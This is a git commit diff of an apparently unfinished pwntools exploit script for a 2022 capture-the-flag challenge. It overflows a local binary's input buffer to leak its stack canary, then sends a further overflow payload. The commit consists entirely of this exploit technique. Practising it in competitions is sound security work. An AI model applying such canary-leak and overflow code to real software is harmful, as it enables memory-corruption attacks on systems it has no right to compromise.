e2f373957c2d8190817ed5f8c746341ac1b3f9df
leeminjea <gabe0529@naver.com>
2022-01-28 08:23:58 -0800

    s! 2022 ctf

--- 2022_S!_CTF/ex.py
+++ 2022_S!_CTF/ex.py
@@ -9,6 +9,21 @@ gets_plt = 0x400680
 
 p = process("./ctf")
 
-input()
+canary_pay = b""
+canary_pay += b"A" * 0x81
+
+p.sendafter(">> ",canary_pay)
+p.recvuntil("A" * 0x80)
+
+leak = p.recv(8)[1:]
+print(hex(leak))
+# canary = u64(b"\x00" + leak)
+
+# print(hex(canary))
+
+pay = b""
+pay += b"A"*0x82
+
+p.send(pay)
 
 p.interactive()
